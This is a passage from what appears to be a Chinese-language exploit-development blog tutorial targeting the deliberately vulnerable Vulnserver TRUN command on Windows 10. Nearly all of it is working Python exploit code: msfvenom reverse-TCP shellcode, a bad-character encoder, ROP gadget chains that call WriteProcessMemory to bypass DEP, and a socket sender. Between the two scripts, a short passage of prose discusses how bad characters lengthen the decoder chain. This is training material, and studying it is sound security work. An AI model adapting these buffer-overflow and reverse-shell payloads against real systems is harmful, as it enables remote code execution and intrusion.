neg_offset = (-offset) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">            <span class="keyword">if</span> shellcode[badIndex[i]] == BADCHARS[j]:</span><br><span class="line">                value = CHARSTOADD[j]</span><br><span class="line">        value = (value) | <span class="number">0x11111100</span>    <span class="comment"># DL</span></span><br><span class="line">        print(hex(value))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># current EAX point to the address of shellcode-1</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x7637768e</span>))   <span class="comment"># POP ECX # RETN       ** [WS2_32.DLL] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (neg_offset))</span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x758ba9a8</span>))   <span class="comment"># SUB EAX,ECX # RETN   ** [KERNEL32.DLL] ** </span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (<span class="number">0x7721aed0</span>))             <span class="comment"># POP EDX # RETN       ** [ntdll.dll] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (value))                  <span class="comment"># values in DL</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x755bc4eb</span>))   <span class="comment"># ADD BYTE PTR [EAX],DL # RETN    ** [KERNELBASE.dll] ** </span></span><br><span class="line">    <span class="keyword">return</span> restoreRop </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode</span></span><br><span class="line">    shellcode =  <span class="string">b""</span></span><br><span class="line">    shellcode += <span class="string">b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"</span></span><br><span class="line">    shellcode += <span class="string">b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"</span></span><br><span class="line">    shellcode += <span class="string">b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"</span></span><br><span class="line">    shellcode += <span class="string">b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"</span></span><br><span class="line">    shellcode += <span class="string">b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"</span></span><br><span class="line">    shellcode += <span class="string">b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"</span></span><br><span class="line">    shellcode += <span class="string">b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"</span></span><br><span class="line">    shellcode += <span class="string">b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"</span></span><br><span class="line">    shellcode += <span class="string">b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"</span></span><br><span class="line">    shellcode += <span class="string">b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"</span></span><br><span class="line">    shellcode += <span class="string">b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"</span></span><br><span class="line">    shellcode += <span class="string">b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span></span><br><span class="line">    shellcode += <span class="string">b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"</span></span><br><span class="line">    shellcode += <span class="string">b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"</span></span><br><span class="line">    shellcode += <span class="string">b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"</span></span><br><span class="line">    shellcode += <span class="string">b"\x6a\x05\x68\xc0\xa8\x5b\x89\x68\x02\x00\x11"</span></span><br><span class="line">    shellcode += <span class="string">b"\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"</span></span><br><span class="line">    shellcode += <span class="string">b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"</span></span><br><span class="line">    shellcode += <span class="string">b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"</span></span><br><span class="line">    shellcode += <span class="string">b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"</span></span><br><span class="line">    shellcode += <span class="string">b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"</span></span><br><span class="line">    shellcode += <span class="string">b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"</span></span><br><span class="line">    shellcode += <span class="string">b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"</span></span><br><span class="line">    shellcode += <span class="string">b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a"</span></span><br><span class="line">    shellcode += <span class="string">b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"</span></span><br><span class="line">    shellcode += <span class="string">b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"</span></span><br><span class="line">    shellcode += <span class="string">b"\x6a\x00\x53\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">    pos = mapBadChars(shellcode)</span><br><span class="line">    print(pos)</span><br><span class="line">    encodedRevShell = encodeShellcode(shellcode)</span><br><span class="line"></span><br><span class="line">    func  = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x45454545</span>)     <span class="comment"># WriteProcessMemory Address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Shellcode Return Address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xFFFFFFFF</span>)     <span class="comment"># pseudo Process handle</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Code cave address</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy lpBuffer (Stack address) </span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy nSize</span></span><br><span class="line">    func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62502028</span>)     <span class="comment"># lpNumberOfBytesWritten</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    eip   = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501022</span>)     <span class="comment"># retn   essfunc.dll</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># save ESP to ESI,EDX,EAX</span></span><br><span class="line">    rop1  = struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755912d6</span>)    <span class="comment"># PUSH ESP # POP ESI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755b671f</span>)    <span class="comment"># MOV EDX,ESI # POP ESI # RETN 0x04    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7728bdf4</span>)    <span class="comment"># MOV EAX,EDX # POP ESI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching dummy lpBuffer</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x88888888</span>)    <span class="comment"># 0x88888888</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x77777988</span>)    <span class="comment"># 0x77777988</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758fe636</span>)    <span class="comment"># MOV EAX,EDX # RETN  </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN </span></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching dummy nSize</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffffdf4</span>)    <span class="comment"># 0xfffffdf4</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN  </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Patching  WriteProcessMemory Address</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x74a01e84</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x62506090</span>)    <span class="comment"># IAT 62506090  AddAtomA KERNEL32 </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75fd7518</span>)    <span class="comment"># XCHG EAX,DWORD PTR [ECX] # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7557771b</span>)    <span class="comment"># POP EAX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0xfffd9df0</span>)    <span class="comment"># 0xfffd9df0</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758f15ce</span>)    <span class="comment"># NEG EAX # RETN   </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x76068122</span>)    <span class="comment"># XCHG EAX,EDI # RETN    </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN    </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># save current EAX to EBX</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7730e63c</span>)    <span class="comment"># XCHG EAX,ESI # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75f84c67</span>)    <span class="comment"># MOV EAX,ESI # RETN</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Align EAX with shellcode</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a5a6f</span>)    <span class="comment"># POP ECX # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xfffffda8</span>)     <span class="comment"># 0n600</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772974e4</span>)    <span class="comment"># SUB EAX,ECX # RETN    ** [ntdll.dll] ** </span></span><br><span class="line"></span><br><span class="line">    rop1 += decodeShellcode(<span class="number">0</span>, pos, shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Align ESP with ROP Skeleton</span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7730e63c</span>)    <span class="comment"># XCHG EAX,ESI # RETN </span></span><br><span class="line">    rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f2002</span>)    <span class="comment"># XCHG EAX,ESP # RETN    </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># padding = b"C" * (3000-2006-32-len(rop1)-len(shellcode))</span></span><br><span class="line">    padding = <span class="string">b"\x44"</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    PAYLOAD = (</span><br><span class="line">        <span class="string">b'TRUN .'</span> +</span><br><span class="line">        <span class="string">b'A'</span> * (<span class="number">2006</span>-len(func)) +</span><br><span class="line">        func +</span><br><span class="line">        eip +</span><br><span class="line">        rop1 + </span><br><span class="line">        <span class="string">b"\x90"</span>*<span class="number">80</span>+</span><br><span class="line">        encodedRevShell+</span><br><span class="line">        padding</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket.create_connection((HOST, PORT)) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.sendall(PAYLOAD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>喜闻乐见的反弹<code>shell</code>如下：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/21.png" alt="BOF"></p>
+<p>单坏字符，用于解码的<code>ROP Gadgets</code>一般不会很长，如果涉及很多坏字符，解码的<code>ROP Gadgets</code>会很长，最终可能因为栈空间不够，导致<code>shellcode</code>受到挤压，后续被截断，最终导致利用失败。</p>
+<p>尝试7个坏字符时，最后因为栈空间不够导致<code>shellcode</code>被截断了。最终，试了<code>3</code>个坏字符的情况，还算正常。利用脚本如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'192.168.91.160'</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapBadChars</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00\x09\x0a"</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    badIndex = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(sh):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> BADCHARS:</span><br><span class="line">            <span class="keyword">if</span> sh[i] == c:</span><br><span class="line">                badIndex.append(i)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> badIndex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeShellcode</span><span class="params">(sh)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00\x09\x0a"</span></span><br><span class="line">    REPLACECHARS = <span class="string">b"\xff\x10\x06"</span></span><br><span class="line">    encodedShell = sh</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">        encodedShell = encodedShell.replace(struct.pack(<span class="string">"B"</span>, BADCHARS[i]), struct.pack(<span class="string">"B"</span>, REPLACECHARS[i]))</span><br><span class="line">    <span class="keyword">return</span> encodedShell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeShellcode</span><span class="params">(dllBase, badIndex, shellcode)</span>:</span></span><br><span class="line">    BADCHARS = <span class="string">b"\x00\x09\x0a"</span></span><br><span class="line">    CHARSTOADD = <span class="string">b"\x01\xf9\x04"</span></span><br><span class="line">    restoreRop = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(badIndex)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            offset = badIndex[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            offset = badIndex[i] - badIndex[i<span class="number">-1</span>]</span><br><span class="line">        neg_offset = (-offset) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(BADCHARS)):</span><br><span class="line">            <span class="keyword">if</span> shellcode[badIndex[i]] == BADCHARS[j]:</span><br><span class="line">                value = CHARSTOADD[j]</span><br><span class="line">        value = (value) | <span class="number">0x11111100</span>    <span class="comment"># DL</span></span><br><span class="line">        print(hex(value))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># current EAX point to the address of shellcode-1</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x7637768e</span>))   <span class="comment"># POP ECX # RETN       ** [WS2_32.DLL] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (neg_offset))</span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x758ba9a8</span>))   <span class="comment"># SUB EAX,ECX # RETN   ** [KERNEL32.DLL] ** </span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (<span class="number">0x7721aed0</span>))             <span class="comment"># POP EDX # RETN       ** [ntdll.dll] **</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (value))                  <span class="comment"># values in DL</span></span><br><span class="line">        restoreRop += struct.pack(<span class="string">"&lt;L"</span>, (dllBase + <span class="number">0x755bc4eb</span>))   <span class="comment"># ADD BYTE PTR [EAX],DL # RETN    ** [KERNELBASE.dll] ** </span></span><br><span class="line">    <span class="keyword">return</span> restoreRop </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode</span></span><br><span class="line">    shellcode =  <span class="string">b""</span></span><br><span class="line">    shellcode += <span class="string">b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"</span></span><br><span class="line">    shellcode += <span class="string">b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"</span></span><br><span class="line">    shellcode += <span class="string">b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"</span></span><br><span class="line">    shellcode += <span class="string">b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"</span></span><br><span class="line">    shellcode += <span class="string">b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"</span></span><br><span class="line">    shellcode += <span class="string">b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"</span></span><br><span class="line">    shellcode += <span class="string">b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"</span></span><br><span class="line">    shellcode += <span class="string">b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"</span></span><br><span class="line">    shellcode += <span class="string">b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"</span></span><br><span class="line">    shellcode += <span class="string">b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"</span></span><br><span class="line">    shellcode += <span class="string">b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"</span></span><br><span class="line">    shellcode += <span class="string">b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span></span><br><span class="line">    shellcode += <span class="string">b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"</span></span><br><span class="line">    shellcode += <span class="string">b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"</span></span><br><span class="line">    shellcode += <span class="string">b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"</span></span><br><span class="line">    shellcode += <span class="string">b"\x6a\x05\x68\xc0\xa8\x5b\x89\x68\x02\x00\x11"</span></span><br><span class="line">    shellcode += <span class="string">b"\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"</span></span><br><span class="line">    shellcode += <span class="string">b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"</span></span><br><span class="line">    shellcode += <span class="string">b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"</span></span><br><span class="line">    shellcode += <span class="string">b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"</span></span><br><span class="line">    shellcode += <span class="string">b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"</span></span><br><span class="line">    shellcode += <span class="string">b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"</span></span><br><span class="line">    shellcode += <span class="string">b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"</span></span><br><span class="line">    shellcode += <span class="string">b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"</span></span><br><span class="line">    shellcode += <span class="string">b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a"</span></span><br><span class="line">    shellcode += <span 